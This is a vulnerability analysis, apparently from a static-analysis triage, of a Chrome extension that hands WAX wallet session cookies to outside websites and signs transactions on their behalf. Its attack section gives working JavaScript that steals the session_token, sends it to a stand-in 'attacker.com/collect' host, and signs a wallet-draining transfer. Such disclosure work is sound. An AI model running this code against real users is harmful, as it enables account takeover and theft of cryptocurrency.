# CoCo Analysis: hemccdpfndbjdbheddegacchifgolnpg

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 11 (all related to same vulnerability - cookie information disclosure)

---

## Sink: cookies_source → sendResponseExternal_sink

**CoCo Trace:**
```
Multiple flows from cookies_source to sendResponseExternal_sink detected by CoCo.
Note: CoCo referenced framework mock code. The actual vulnerability exists in original extension code.
```

**Code:**

```javascript
// Background script (bg.js)
chrome.runtime.onMessageExternal.addListener(async function (message, sender, sendResponse) {
    const type = message.type;
    const data = message.data;
    let res;

    switch (type) {
        // Delete cookie
        case 'CLEAN_COOKIE':
            cleanCookie();
            sendResponse({
                'success': true,
                'message': 'ok'
            });
            break;

        // Get cookie - VULNERABLE
        case 'GET_COOKIE':
            await chrome.cookies.getAll({
                url: 'https://wallet.wax.io' // Reads WAX wallet cookies
            }, cookies => {
                removeSessionRules();
                const items = cookies.filter(item => item.name === 'session_token');

                if (items.length > 0) {
                    sendResponse({
                        'success': true,
                        'message': 'ok',
                        data: items[0] // ← sends session_token cookie to external caller
                    });
                } else {
                    sendResponse({
                        'success': false,
                        'message': 'error',
                        data: null
                    });
                }
            });
            break;

        // Get signature - Uses attacker-provided data
        case 'GET_SIGN':
            res = await getSignV2(data); // ← uses attacker-provided transaction data
            if (res.verified === false) {
                res = await getSignV2(data);
            }
            removeSessionRules();
            sendResponse({
                'success': true,
                'message': 'ok',
                data: res
            });
            break;

        // Get user info - Uses attacker-provided data
        case 'GET_INFO':
            res = await getSession(data); // ← uses attacker-provided token
            removeSessionRules();
            sendResponse({
                'success': true,
                'message': 'ok',
                data: res
            });
            break;
    }
});

// Helper function that uses attacker-provided data
async function getSignV2(data) {
    const url = 'https://api-idm.wax.io/v1/accounts/auto-accept/signing';
    await updateSessionRules(url, data);
    const body = {
        'transaction': data.transaction, // ← attacker-controlled
        'freeBandwidth': true
    };
    const response = await fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'cookie': 'session_token=' + data.token // ← attacker-controlled token
        },
        body: JSON.stringify(body)
    });
    return response.json();
}

async function getSession(data) {
    const url = 'https://all-access.wax.io/api/session';
    await updateSessionRules(url, data);
    const response = await fetch(url, {
        method: 'GET',
        headers: {
            'Content-Type': 'application/json;charset=utf-8',
            'cookie': 'session_token=' + data.token // ← attacker-controlled token
        }
    });
    return response.json();
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.onMessageExternal - External website messaging

**Attack:**

```javascript
// From any page on *.lanren.io or *.farmersworld.app:

// 1. Steal session_token cookie from wallet.wax.io
chrome.runtime.sendMessage(
    "hemccdpfndbjdbheddegacchifgolnpg",
    {
        type: "GET_COOKIE"
    },
    function(response) {
        if (response.success) {
            console.log("Stolen session token:", response.data);
            // response.data contains the session_token cookie object with:
            // - name: "session_token"
            // - value: <actual token value>
            // - domain, path, expiration, etc.

            // Exfiltrate to attacker server
            fetch("https://attacker.com/collect", {
                method: "POST",
                body: JSON.stringify({
                    token: response.data.value,
                    cookie: response.data
                })
            });
        }
    }
);

// 2. Use stolen token to make requests as the user
chrome.runtime.sendMessage(
    "hemccdpfndbjdbheddegacchifgolnpg",
    {
        type: "GET_INFO",
        data: {
            token: "stolen_session_token_value"
        }
    },
    function(response) {
        console.log("User info obtained:", response.data);
    }
);

// 3. Make the extension sign malicious transactions
chrome.runtime.sendMessage(
    "hemccdpfndbjdbheddegacchifgolnpg",
    {
        type: "GET_SIGN",
        data: {
            token: "stolen_session_token_value",
            transaction: {
                // Malicious transaction to drain user's WAX wallet
                actions: [{
                    account: "eosio.token",
                    name: "transfer",
                    authorization: [{actor: "victim_account", permission: "active"}],
                    data: {
                        from: "victim_account",
                        to: "attacker_account",
                        quantity: "1000.00000000 WAX",
                        memo: ""
                    }
                }]
            }
        }
    },
    function(response) {
        console.log("Transaction signed:", response.data);
    }
);
```

**Impact:** This extension has critical security vulnerabilities that expose WAX blockchain wallet users to account takeover and financial theft:

1. **Session Token Theft**: External websites can steal the `session_token` cookie from wallet.wax.io, which grants full access to the user's WAX wallet account. This enables complete account takeover.

2. **Unauthorized Transaction Signing**: Attackers can abuse the GET_SIGN functionality to sign arbitrary transactions using stolen tokens, potentially draining the user's WAX cryptocurrency holdings.

3. **User Information Disclosure**: Attackers can retrieve sensitive user account information from the WAX platform using stolen tokens.

The extension is accessible from *.lanren.io and *.farmersworld.app domains, so any XSS or malicious content on these domains (including any subdomains) can exploit these vulnerabilities to steal cryptocurrency assets.

---

**Note:** CoCo detected 11 separate flows for different cookie fields (name, value, domain, path, expirationDate, etc.), but they all represent the same underlying vulnerability - the leakage of the session_token cookie through the insecure onMessageExternal handler.
